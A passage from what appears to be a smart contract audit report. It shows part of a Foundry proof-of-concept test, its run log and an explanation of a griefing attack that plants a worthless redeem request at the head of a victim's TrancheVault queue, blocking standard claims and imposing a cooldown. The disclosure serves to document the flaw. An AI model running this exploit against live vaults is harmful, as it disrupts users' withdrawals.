        assertEq(s.token.balanceOf(victim), usdcBefore + paid, "victim received real-epoch assets");
        assertEq(s.juniorVault.controllerRedeemHead(victim), plantEpoch, "head untouched by explicit-id claim");
        emit log_named_uint("claim-by-request-id paid (USDG base units)", paid);
        emit log_string("WORKAROUND: claimRedeem(requestId, ...) bypasses the planted head");

        // ------------------------------------------------------------------
        // Block 3: full recovery requires processing the worthless head. The
        // refund acknowledgement returns the attacker's dust to the victim and
        // stamps a fresh 1h cooldown on the victim's wallet.
        // ------------------------------------------------------------------
        vm.prank(victim);
        uint256 refundedShares = s.juniorVault.claimRedeemRefund(plantEpoch, victim, victim);
        assertEq(refundedShares, PLANT_SHARES, "attacker's dust returned to the victim");
        assertEq(s.juniorVault.controllerRedeemHead(victim), realEpoch, "head advanced past the plant");
        assertEq(s.juniorVault.lastDepositTime(victim), block.timestamp, "recovery stamped a fresh cooldown");

        // New redeem requests (and transfers) are now cooldown-blocked for 1 hour.
        uint256 remainingBalance = s.juniorVault.balanceOf(victim);
        assertGt(remainingBalance, 0, "victim still holds shares");
        vm.prank(victim);
        try s.juniorVault.requestRedeem(remainingBalance, victim, victim) {
            assertTrue(false, "requestRedeem should be cooldown-blocked");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason), TrancheVault.TrancheVault__DepositCooldown.selector, "cooldown revert on new requests"
            );
            emit log_string("COOLDOWN: victim's next requestRedeem blocked for 1h after clearing the plant");
        }

        // Standard claims work again for the real epoch.
        uint256 restShares = s.juniorVault.claimableRedeemRequest(realEpoch, victim);
        uint256 restAssets = s.juniorVault.claimableRedeemAssets(realEpoch, victim);
        assertGt(restShares, 0, "real epoch remainder claimable");
        usdcBefore = s.token.balanceOf(victim);
        vm.prank(victim);
        s.juniorVault.redeem(restShares, victim, victim);
        assertEq(s.token.balanceOf(victim), usdcBefore + restAssets, "standard redeem works after head cleared");
        emit log_named_uint("standard redeem after recovery paid (USDG base units)", restAssets);

        // ...and after the cooldown elapses the victim can request again.
        vm.warp(block.timestamp + 1 hours + 1);
        vm.prank(victim);
        s.juniorVault.requestRedeem(remainingBalance, victim, victim);
        emit log_string("recovered: cooldown elapsed, victim can request again");

        // ------------------------------------------------------------------
        // Attacker economics: the plant cost only the forfeited dust (returned to
        // the victim), yet forced: (a) blocked standard claims until processed,
        // (b) one extra acknowledgement transaction, (c) a 1h exit cooldown.
        // ------------------------------------------------------------------
        emit log_string("=========================================================");
        emit log_named_uint("attacker cost (share wei, forfeited to victim)", PLANT_SHARES);
        emit log_string("victim impact: standard claims blocked + 1 extra tx + 1h cooldown; no principal loss");
        emit log_string("=========================================================");
    }
}

```

Logs (full run):

```
Ran 1 test for test/Plant.t.sol:PlantTest
[PASS] test_PoC_PlantWorthlessRedeemRequestAtFrontOfVictimQueue() (gas: 95388356)
Logs:
  victim junior shares: 500000000000000
  planted epoch (victim): 472418
  victim2 early-cancel escape worked (kept the dust, but got a fresh 1h cooldown)
  victim real request epoch: 472419
  victim real epoch funded assets (USDG base units): 250000000000
  BLOCKED: standard redeem(shares, receiver, controller) -> ERC4626ExceededMaxRedeem
  BLOCKED: standard withdraw(assets, receiver, controller) -> ERC4626ExceededMaxWithdraw
  BLOCKED: cancelRedeemRequest(plant) post-maturity -> TrancheVault__RedeemCancellationUnavailable
  claim-by-request-id paid (USDG base units): 125000000000
  WORKAROUND: claimRedeem(requestId, ...) bypasses the planted head
  COOLDOWN: victim's next requestRedeem blocked for 1h after clearing the plant
  standard redeem after recovery paid (USDG base units): 125000000000
  recovered: cooldown elapsed, victim can request again
  =========================================================
  attacker cost (share wei, forfeited to victim): 500
  victim impact: standard claims blocked + 1 extra tx + 1h cooldown; no principal loss
  =========================================================

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.81ms (19.87ms CPU time)

Ran 1 test suite in 25.76ms (20.81ms CPU time): 1 tests passed; 0 failed; 0 skipped (1 total tests)
```

Reading the log: the attacker's 500-share-wei plant (epoch 472418) becomes the victim's queue head; the victim's real request (epoch 472419, $250,000 funded) sits behind it. After settlement, the plant is a terminal zero-payout refund epoch: the standard `redeem`/`withdraw` revert, the head-based views report 0, and the planted request can no longer be cancelled. The explicit-id `claimRedeem` pays the victim $125,000 while the head is blocked. Clearing the head via the refund acknowledgement returns the forfeited dust to the victim and stamps a 1h cooldown that reverts the victim's next `requestRedeem`; after the cooldown the victim requests again, confirming the total impact is one forced acknowledgement transaction, one hour of exit-cooldown, and blocked standard-surface claims in the interim - with no principal at risk.

